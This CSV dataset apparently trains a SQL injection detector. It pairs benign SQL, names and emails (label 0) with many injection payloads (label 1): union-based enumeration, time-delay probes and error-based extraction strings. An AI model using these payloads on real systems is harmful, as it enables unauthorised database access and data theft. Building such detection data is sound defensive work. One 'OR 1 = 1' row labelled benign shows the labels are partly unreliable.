Query,Label
"-9638   )    )     )   or elt  (  1032  =  1032,3623  )   and    (    (     (  3679  =  3679",1
palmera,0
1.3438E+15,0
"1""   )    )    as svim where 4924  =  4924 and 7932  =  5870",1
select   (  case when   (  3855  =  3855  )   then 3855 else 1/  (  select 0  )   end  )  --,1
 UPDATE addition SET consider = 'pack'WHERE cover = 'use',0
"  UPDATE plant SET form =  'blanket', City =  'pound' WHERE hand =  flat",0
" SELECT * FROM package ORDER BY headed ASC, word DESC",0
4.88546E+14,0
"-5573'  )   union all select 2866,2866,2866,2866,2866,2866,2866,2866,2866--",1
SELECT TOP 3 * FROM news WHERE form = 'upon',0
1 or sleep  (  5  )  -- nrzf,1
SELECT * FROM nearly,0
7529,0
-5449' or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and 'ryvy' like 'ryvy,1
"1'   )    )    and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
"1%""   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   ""%""  =  """,1
"   SELECT CustomerName, Address + ', ' + PostalCode + ' ' + City + ', ' + Country    AS Address  FROM Customers;",0
"1   )    )    as khvx where 7533  =  7533 union all select null,null,null,null,null,null,null,null--",1
"1%""",1
8.60573E+15,0
conmi5u52,0
51780892a,0
"1%""   )    )     )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  ""%""  =  """,1
"1  )   where 9687  =  9687 and elt  (  9607  =  9432,9432  )  --",1
keehn,0
alises,0
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ||'",1
"1   )    )    as zmsa where 6909  =  6909 union all select null,null,null,null,null,null,null#",1
"-9947""   )    )     )   union all select 8765,8765,8765,8765,8765#",1
-3339' or 8571  =  8571--,1
select   (  case when   (  5856  =  7176  )   then 5856 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1
"   SELECT speed,exchange,gave,shown,above     (  (  orbit JOIN thought ON food.caught =  fought.does )   INNER JOIN mountainON Orders.somewhere =  under.betweenID ) ",0
8151,0
"1""  )   union all select null,null,null,null#",1
SELECT poet ( s )  FROM written LEFT JOIN,0
1'  )   as fyib where 9246  =  9246,1
"1 and ascii  (  lower  (  substring   (    (   select top 1 name from sysobjects where xtype  =  'u'  )  , 1, 1   )    )     )   > 116",1
SELECT * FROM pile 3,0
oate fijo,0
velasque9,0
select case when 9848  =  2618 then 1 else null end--,1
"   SELECT temperature, which, leaving FROM correctly WHERE mysterious  IS NULL",0
8776,0
SELECT alive ( s )  FROM usually SELECT exactly FROM arm,0
1' in boolean mode  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1
rattanap,0
 UPDATE name SET opinion = 'pride'WHERE bank = 'meant',0
desmedro,0
7u6can*i2a04n,0
"1'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   'pbtf'  =  'pbtf",1
quiles,0
desafinar,0
if  (  6624  =  4232  )   select 6624 else drop function xyyt--,1
SELECT mental FROM double UNION ALL SELECT were FROM sold ORDER BY rice,0
7o14c0o,0
-2790'   )    )    or 8571  =  8571--,1
"-4817 union all select 7415,7415,7415,7415,7415,7415,7415,7415,7415#",1
"-8794   )    )     )   union all select 5802,5802,5802--",1
"1%""   )    )     )   union all select null,null,null,null,null,null,null#",1
%7C,1
depp@rpdkorea.il,0
kalila,0
"1'   )    )     )   and elt  (  9041  =  6421,6421  )   and    (    (     (  'ixxg' like 'ixxg",1
abraham,0
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   ""uidb"" like ""uidb",1
23611263s,0
SELECT * FROM touch 3 SELECT * FROM military,0
SELECT MIN ( taste )  AS involved FROM eight,0
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and ""rugr""  =  ""rugr",1
SELECT * FROM courage  WHERE grow NOT LIKE '[thought]%',0
SELECT rate ( s )  FROM plates,0
"1'   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  'dsok'  =  'dsok",1
"-6883""  )   as tbai where 8121  =  8121 union all select 8121,8121,8121,8121,8121,8121,8121,8121--",1
segundo,0
"1""  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  ""hybu"" like ""hybu",1
"1' and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and 'gzlz' like 'gzlz",1
mouchet@007tv.fj,0
roldan@intelethernet.gl,0
"1'   )    )    as yyja where 4321  =  4321 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
"1'||  (  select 'jzwq' where 3289  =  3289 union all select null,null,null,null,null,null,null#",1
" SELECT * FROM who ORDER BY suppose ASC, correctly DESC",0
"  SELECT gradeID AS ID, over AS entirely FROM but",0
SELECT CONNECTION_ID (  ) ;,0
"-5520""   )    )    as utqk where 7762  =  7762 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1
"1'   )    )    as namw where 1740  =  1740 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",1
infalibilidad,0
48551498q,0
SELECT * FROM walk WHERE sudden LIKE '%serious%',0
" select * from users where id  =  1 or ""$_"" or 1  =  1 -- 1",1
tris2,0
SELECT sea ( s ) FROM while INNER JOIN,0
SELECT COUNT ( featureID ) FROM jar,0
"1'  )   and elt  (  4249  =  4249,7259  )   and   (  'ifca' like 'ifca",1
" SELECT * FROM took ORDER BY everything ASC, dinner DESC",0
"1   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  8738  =  8738",1
"   SELECT are, zulu+ ', ' + practical+ ' ' + hour+ ', ' + beside AS correctly  FROM go",0
"1%""   )    )    or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
messenger@blanquillos.pk,0
SELECT TOP 3 * FROM appropriate WHERE active = 'series' SELECT * FROM event,0
SELECT * FROM broke FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM major,0
"-5187""  )   union all select 3373,3373#",1
1' and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and 'lvyw'  =  'lvyw,1
admin'  )   or '1'  =  '1'--,1
leonila,0
"1'||  (  select 'cozi' from dual where 2607  =  2607 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"1'   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  'zoxm' like 'zoxm",1
FROM  ( SELECT DISTINCT choice FROM event ) ,0
"-2197' union all select 8065,8065,8065,8065--",1
"-1197""   )    )    as dfsy where 8857  =  8857 or 3038  =  3038",1
SELECT TOP 50 PERCENT * FROM horn SELECT * FROM rain FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM prevent,0
DELETE FROM present,0
"1""   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",1
reiner,0
SELECT depth FROM simple UNION SELECT stared FROM horse ORDER BY thought,0
plza. almudaina s/n,0
DELETE FROM seems WHERE cream = 'production',0
berriz,0
" select * from users where id  =  1 *1 union select 1,banner from v$version where rownum  =  1 -- 1",1
filpica,0
"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--",1
mckearne,0
"1   )    )     )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  4924  =  4924",1
"1   )    )    or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   6829  =  6829",1
"1'   )    )     )   union all select null,null,null,null,null,null#",1
SELECT * FROM spider WHERE express = 'improve'  AND  ( wonderful = 'battle' OR gradually = 'west' ) ,0
benabarre,0
"1' where 9003  =  9003 and make_set  (  5868  =  8316,8316  )  --",1
rebes huasequi,0
24711,0
; if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --,1
"1""  )   as rgbz where 6687  =  6687 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
galdo palacn,0
bayarri bach,0
SELECT * FROM understanding FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM during,0
"1' where 7504  =  7504 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --",1
SELECT * FROM production FETCH FIRST 50 PERCENT ROWS ONLY,0
50645313a,0
"   SELECT COUNT ( tears ) , sum FROM total BY continued",0
SELECT foreign ( s )  FROM expect,0
"1'||  (  select 'ymwf' where 1229  =  1229 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   ||'",1
SELECT MIN ( manner )  AS harder FROM base,0
"1%""   )    )     )   waitfor delay '0:0:5'--",1
"-9152""   )    )    as avga where 3825  =  3825 order by 1#",1
"1%""   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",1
SELECT AVG ( atom ) FROM entirely SELECT SUM ( worse ) ,0
waitfor delay '0:0:5' and    (    (     (  'ywnm'  =  'ywnm,1
" SELECT City, Country FROM Suppliers WHERE Country = 'Germany' ORDER BY City;",0
select case when 3920  =  4402 then 1 else null end--,1
" SELECT * FROM continent ORDER BY donkey ASC, eaten DESC",0
SELECT * FROM voyage WHERE atom IN  ( SELECT notice FROM my ) ,0
"  UPDATE steam SET rabbit =  'slipped', City =  'inside' WHERE cast =  pleasure",0
SELECT TOP 3 * FROM careful WHERE interest = 'beyond' SELECT * FROM fence,0
andreu agraso,0
 )   or   (  'x'  =  'x,1
select pg_sleep  (  5  )   and   (  1044  =  1044,1
bfilename,1
SELECT AVG ( property ) FROM flame SELECT SUM ( melted ) ,0
"  SELECT * FROM title WHERE captured NOT IN  ( 'addition', 'cookies', 'previous' )  ",0
3.07443E+15,0
SELECT * FROM noise FETCH FIRST 50 PERCENT ROWS ONLY,0
1' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and 'vwve' like 'vwve,1
SELECT * FROM solid FETCH FIRST 3 ROWS ONLY,0
SELECT becoming ( s )  FROM terrible UNION,0
SELECT straight FROM locate UNION SELECT grow FROM drop ORDER BY house,0
SELECT congress ( s )  FROM contrast UNION,0
-6144'  )   or 9385  =  2474--,1
SELECT * FROM shut WHERE five = 'combine'  OR wore = 'put',0
SELECT * FROM wp_posts WHERE ID  =  367848 LIMIT 1,0
halford,0
32425777d,0
shue-sampson@artroscopiagc.mn,0
" select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'",1
SELECT * FROM everything FETCH FIRST 50 PERCENT ROWS ONLY,0
-5970' where 2769  =  2769 union all select 2769--,1
SELECT * FROM can WHERE NOT brief = 'desk'  AND NOT method = 'its',0
"1%""   )    )    or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
 (  select   (  case when   (  1421  =  1421  )   then 1 else 1421*  (  select 1421 from master..sysdatabases  )   end   )    ) ,1
SELECT AVG ( key )  FROM pair  SELECT SUM ( level ) ,0
9195,0
SELECT * FROM middle,0
agujer4e2o,0
SELECT * FROM hungry FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM knowledge,0
tamer,0
SELECT applied ( s )  FROM suggest FULL OUTER JOIN,0
1'+  (  select 'vtyw' where 7950  =  7950 order by 1--,1
roze,0
isador,0
DELETE FROM lead WHERE thus = 'trouble',0
SELECT * FROM if  WHERE cage = military,0
SELECT * FROM laid ORDER BY successful,0
1'+  (  select nsri where 1202  =  1202 and 4595  =  4595#,1
getulio,0
SELECT * FROM merely,0
SELECT * FROM large WHERE own BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT * FROM great WHERE expect = 'shape'  AND  ( immediately = 'either' OR sand = 'early' ) ,0
1' in boolean mode  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  #,1
gunther@nik.com.tn,0
10200,0
SELECT label ( s )  FROM grown FULL OUTER JOIN,0
vajih,0
SELECT AVG ( recognize ) FROM quiet,0
8.35555E+15,0
SELECT COUNT ( DISTINCT date )  FROM ground,0
"1""  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  ""cdnc"" like ""cdnc",1
comprensin,0
SELECT * FROM children WHERE use IN  ( SELECT blanket FROM aside ) ,0
SELECT * FROM tongue WHERE left = 'father' LIMIT 3,0
casasola de arin,0
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   '%'  =  '",1
"1'  )   as keom where 7524  =  7524 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
SELECT * FROM separate,0
"1' or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and 'qvyq' like 'qvyq",1
fresia,0
"1""   )    )    or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   ""qgle"" like ""qgle",1
"SELECT ProductName, Price FROM Products ",0
"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",1
"1'  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  ",1
7.02E+15,0
SELECT AVG ( mud )  FROM learn  SELECT SUM ( cannot ) ,0
"-1422%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%""  =  """,1
SELECT * FROM tall  WHERE hung = brief,0
SELECT AVG ( Price ) FROM kind,0
cnico,0
SELECT AVG ( complete ) FROM iron,0
"""   )    )    or    (    (   ""x""   )    )     =     (    (   ""x",1
"-1583'  )   or elt  (  1032  =  1032,3623  )   and   (  'jrcj' like 'jrcj",1
"-2384%'   )    )    union all select 2467,2467,2467,2467#",1
"   SELECT joined, boat+ ', ' + its+ ' ' + label+ ', ' + broken AS club  FROM joy",0
cobea,0
1.94E+15,0
"1   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  7484  =  7484",1
1'  )   as wtev where 5283  =  5283,1
granach@mccomptables.be,0
leni,0
"c/ de las gloxinias 91,",0
"1%""   )    )    or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
holness,0
gavald,0
SELECT column_name FROM table_name ORDER BY column_name FETCH FIRST number ROWS ONLY;,0
"-6405' union all select 8235,8235,8235,8235,8235#",1
1'+  (  select 'tbfj' where 4016  =  4016,1
1'  )   and 2564  =  3234--,1
"1 where 7051  =  7051 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
SELECT * FROM highest WHERE loose = 'still' FETCH FIRST 3 ROWS ONLY,0
DELETE FROM beauty,0
"1""  )   as mibc where 3113  =  3113",1
"1""  )   where 4182  =  4182 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",1
SELECT TOP 3 * FROM twenty WHERE word = 'research',0
1' waitfor delay '0:0:5' and 'dtej' like 'dtej,1
canella,0
rossenberck,0
-4761 order by 1--,1
desnudez,0
"1""   )    )    as jgie where 8017  =  8017 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --",1
select sleep  (  5   )    )   ||',1
"masia can sang, 33",0
terangue,0
"1'  )   as jiic where 6158  =  6158 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1
1 where 2956  =  2956,1
17744,0
SELECT * FROM Users WHERE UserId  =  105 OR 1 = 1;,0
6087,0
SELECT COUNT ( led )  FROM diagram,0
SELECT * FROM enemy WHERE printed NOT BETWEEN 'house' AND 'knew',0
SELECT * FROM additional WHERE writing NOT BETWEEN 'any' AND 'peace',0
1'  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  'nqol'  =  'nqol,1
SELECT around ( s )  FROM court SELECT work FROM pipe,0
l5r78gea,0
vajil-la,0
"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",1
"-9392   )    )    or elt  (  1032  =  1032,3623  )   and    (    (   2975  =  2975",1
SELECT TOP 50 PERCENT * FROM nearby SELECT * FROM serious FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM clear,0
SELECT * FROM natural WHERE piece NOT LIKE 'roar%',0
"-6381%"" or 8571  =  8571--",1
"SELECT * FROM plastic WHERE rich BETWEEN ""low"" AND    ""aloud""",0
SELECT * FROM sat WHERE giving BETWEEN '1996-07-01' AND '1996-07-31',0
"1'  )   where 6214  =  6214 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",1
